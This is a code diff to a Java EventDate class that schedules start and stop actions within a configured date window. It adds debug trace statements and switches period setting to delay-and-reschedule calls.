@@ -27,10 +27,10 @@ public class EventDate extends Event {
 
         try {
             dateFrom = conf.getDate("datefrom");
-            
-            if(conf.has("dateto")){
+
+            if (conf.has("dateto")) {
                 dateTo = conf.getDate("dateto");
-            }else{
+            } else {
                 dateTo = new Date(Long.MAX_VALUE);
             }
         } catch (ConfigurationException e) {
@@ -41,13 +41,19 @@ public class EventDate extends Event {
     }
 
     public void actualStart() {
-
+        //#ifdef DEBUG
+        debug.trace("actualStart");
+        //#endif
         start = Calendar.getInstance(TimeZone.getTimeZone("GMT"));
         start.setTime(dateFrom);
         stop = Calendar.getInstance(TimeZone.getTimeZone("GMT"));
         stop.setTime(dateTo);
 
         Calendar now = Calendar.getInstance(TimeZone.getTimeZone("GMT"));
+        //#ifdef DEBUG
+        debug.trace("actualStart from: " + start.getTime() + " to: "
+                + stop.getTime() + " now: " + now.getTime());
+        //#endif
 
         if (now.before(start)) {
             //#ifdef DEBUG
@@ -70,23 +76,34 @@ public class EventDate extends Event {
     private boolean setDailyDelay() {
         Calendar now = Calendar.getInstance(TimeZone.getTimeZone("GMT"));
 
+        long period;
         if (now.before(start)) {
-            setPeriod((start.getTime().getTime() - now.getTime().getTime()) / 1000);
+            period = (start.getTime().getTime() - now.getTime().getTime());
+            //#ifdef DEBUG
+            debug.trace("setDailyDelay (now before start) new period:" + period);
+            //#endif
+            setDelay(period);
+            reschedule();
             return true;
         } else if (now.before(stop)) {
-            setPeriod((stop.getTime().getTime() - now.getTime().getTime()) / 1000);
+            period = (stop.getTime().getTime() - now.getTime().getTime());
+            //#ifdef DEBUG
+            debug.trace("setDailyDelay (now before stop) new period:" + period);
+            //#endif
+            setDelay(period);
+            reschedule();
             return false;
         } else {
             this.onExit();
-            setPeriod(NEVER);
+            setDelay(NEVER);
+            reschedule();
             return false;
         }
-
     }
 
     public void actualGo() {
         //#ifdef DEBUG
-        debug.trace(" Info: " + "triggering");//$NON-NLS-1$ //$NON-NLS-2$
+        debug.trace("actualGo");
         //#endif
 
         if (nextDailyIn) {
@@ -112,6 +129,9 @@ public class EventDate extends Event {
     }
 
     public void actualStop() {
+        //#ifdef DEBUG
+        debug.trace("actualStop");
+        //#endif
         onExit(); // di sicurezza
     }
 
